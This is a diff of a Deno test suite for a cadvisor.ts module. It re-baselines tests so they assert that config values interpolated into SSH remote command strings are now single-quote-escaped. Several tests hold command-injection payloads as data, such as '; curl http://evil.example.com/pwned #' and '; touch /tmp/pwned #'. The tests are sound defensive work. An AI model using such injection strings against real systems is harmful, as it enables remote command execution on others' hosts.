@@ -1,16 +1,21 @@
 /**
  * Adversarial suite: separates the TWO interpolation sites in cadvisor.ts's
- * SSH boundary (the safe destination argv element vs. the real
- * remote-shell-injection gap in the command string), pins remove()'s
- * unconditional/non-idempotent teardown, hostile/malformed HTTP response
- * handling for both the cAdvisor and VictoriaMetrics APIs, and a mechanical
- * fixtures-secret-scan over cadvisor/fixtures/* (both JSON and text).
+ * SSH boundary (the safe destination argv element vs. the remote-command
+ * string sent to the REMOTE shell), pins remove()'s unconditional/
+ * non-idempotent teardown, hostile/malformed HTTP response handling for both
+ * the cAdvisor and VictoriaMetrics APIs, and a mechanical fixtures-secret-scan
+ * over cadvisor/fixtures/* (both JSON and text).
  *
- * cadvisor.ts is UNMODIFIED — every test here PINS current behavior
- * (including behavior that is arguably risky) rather than proposing a fix.
- * Where a test documents a real gap, it is labeled "pin" and says so
- * explicitly. The 7 latent bugs this suite characterizes are tracked in the
- * LOCAL `cadvisor-latent-bugs` issue-lifecycle model, not fixed here.
+ * Site 2 (vmComposeDir / vmScrapeConfig / vmComposeFile) is now hardened via
+ * the workspace-canonical `shellEsc` helper — bug #1 (HIGH, remote-shell
+ * command injection) in `cadvisor-latent-bugs` is CLOSED as of 2026.08.01.1.
+ * The four tests below are re-baselined to assert the single-quote-wrapped,
+ * safely-escaped command strings instead of the previously-unescaped ones.
+ *
+ * The remaining 6 latent bugs (fragile `sed` range-delete, unnormalized
+ * cpuPercent, empty-aliases name collapse, unclamped counter-reset deltas,
+ * README typeVersion drift, hardcoded VM port) are still tracked, unfixed,
+ * and pinned in the LOCAL `cadvisor-latent-bugs` issue-lifecycle model.
  */
 import { assert, assertEquals, assertRejects } from "jsr:@std/assert@1";
 import { model } from "./cadvisor.ts";
@@ -219,13 +224,14 @@ Deno.test("SAFE: a hostile username value is likewise confined to the single des
 });
 
 // ---------------------------------------------------------------------------
-// Site 2 (THE REAL GAP): vmComposeDir / vmScrapeConfig / vmComposeFile are
-// interpolated UNESCAPED into the COMMAND STRING that ssh hands to the
-// REMOTE shell — this is a genuine remote-shell command-injection surface.
-// Documented, not fixed (cadvisor.ts is byte-frozen for this change).
+// Site 2 (HARDENED): vmComposeDir / vmScrapeConfig / vmComposeFile are now
+// escaped via shellEsc before being interpolated into the COMMAND STRING that
+// ssh hands to the REMOTE shell — closing the HIGH remote-shell
+// command-injection gap (bug #1 in cadvisor-latent-bugs, defense-in-depth
+// against a hostile-admin or misconfiguration vector).
 // ---------------------------------------------------------------------------
 
-Deno.test("pin: a hostile vmScrapeConfig value is interpolated UNESCAPED into the `cat` command string sent to the REMOTE shell (status)", async () => {
+Deno.test("hardened: a hostile vmScrapeConfig value is single-quote-escaped via shellEsc before landing in the `cat` command string sent to the REMOTE shell (status)", async () => {
   const hostileScrapeConfig =
     "config.yml; curl http://evil.example.com/pwned #";
   const { ctx } = makeCtx({
@@ -243,15 +249,15 @@ Deno.test("pin: a hostile vmScrapeConfig value is interpolated UNESCAPED into th
       const catCall = calls.find((c) => sshCommandOf(c).startsWith("cat "))!;
       assertEquals(
         sshCommandOf(catCall),
-        `cat /opt/victoriametrics/${hostileScrapeConfig}`,
-        "the hostile config filename appears UNESCAPED in the remote command string — " +
-          "a real ssh session would hand this to the remote /bin/sh, executing the curl",
+        `cat '/opt/victoriametrics/${hostileScrapeConfig}'`,
+        "the hostile config filename is single-quote-wrapped by shellEsc in the remote command string — " +
+          "a real ssh session hands this to the remote /bin/sh as ONE inert argument, never executing the curl",
       );
     },
   );
 });
 
-Deno.test("pin: a hostile vmComposeDir value is interpolated UNESCAPED into deploy's `cd ... && docker compose` command string", async () => {
+Deno.test("hardened: a hostile vmComposeDir value is single-quote-escaped via shellEsc in deploy's `cd ... && docker compose` command string", async () => {
   const hostileComposeDir = "/opt/vm && curl http://evil.example.com/pwned #";
   const { ctx } = makeCtx({ ...GLOBAL_ARGS, vmComposeDir: hostileComposeDir });
   await withSyncSetTimeout(() =>
@@ -275,16 +281,16 @@ Deno.test("pin: a hostile vmComposeDir value is interpolated UNESCAPED into depl
         )!;
         assertEquals(
           sshCommandOf(composeCall),
-          `cd ${hostileComposeDir} && docker compose -f compose-vl-single.yml restart victoriametrics`,
-          "the hostile compose dir appears UNESCAPED before the '&&' — a real remote shell " +
-            "would run the injected curl BEFORE docker compose even starts",
+          `cd '${hostileComposeDir}' && docker compose -f 'compose-vl-single.yml' restart victoriametrics`,
+          "the hostile compose dir is single-quote-wrapped before the '&&' — the injected " +
+            "curl is now inert data inside the quotes, never executed by the remote shell",
         );
       },
     )
   );
 });
 
-Deno.test("pin: a hostile vmComposeFile value is interpolated UNESCAPED into the `-f <file>` flag of the remote docker compose command", async () => {
+Deno.test("hardened: a hostile vmComposeFile value is single-quote-escaped via shellEsc in the `-f <file>` flag of the remote docker compose command", async () => {
   const hostileComposeFile =
     "compose.yml; curl http://evil.example.com/pwned #";
   const { ctx } = makeCtx({
@@ -300,17 +306,17 @@ Deno.test("pin: a hostile vmComposeFile value is interpolated UNESCAPED into the
       )!;
       assertEquals(
         sshCommandOf(restartCall),
-        `cd /opt/victoriametrics && docker compose -f ${hostileComposeFile} restart victoriametrics`,
-        "the hostile compose-file value is embedded verbatim, unescaped, in the remote command",
+        `cd '/opt/victoriametrics' && docker compose -f '${hostileComposeFile}' restart victoriametrics`,
+        "the hostile compose-file value is single-quote-wrapped, never embedded verbatim, in the remote command",
       );
     },
   );
 });
 
-Deno.test("pin: contrast — the SAME hostile string used as vmComposeDir (remote command, unsafe) vs. as host (ssh destination, safe) demonstrates the two sites are genuinely different", async () => {
+Deno.test("hardened: contrast — the SAME hostile string used as vmComposeDir (remote command, now shellEsc-quoted) vs. as host (ssh destination, argv-confined) demonstrates the two sites use different-but-now-both-safe mechanisms", async () => {
   const hostile = "x; touch /tmp/pwned #";
 
-  // As vmComposeDir: lands unescaped inside the remote command string.
+  // As vmComposeDir: now single-quote-escaped inside the remote command string.
   const { ctx: ctx1 } = makeCtx({ ...GLOBAL_ARGS, vmComposeDir: hostile });
   await withCommandStub(
     () => OK(),
@@ -318,8 +324,8 @@ Deno.test("pin: contrast — the SAME hostile string used as vmComposeDir (remot
       await run("remove", {}, ctx1);
       const cmd = sshCommandOf(calls[2]);
       assert(
-        cmd.startsWith(`cd ${hostile} &&`),
-        "unescaped inside the command string",
+        cmd.startsWith(`cd '${hostile}' &&`),
+        "escaped via shellEsc inside the command string",
       );
     },
   );
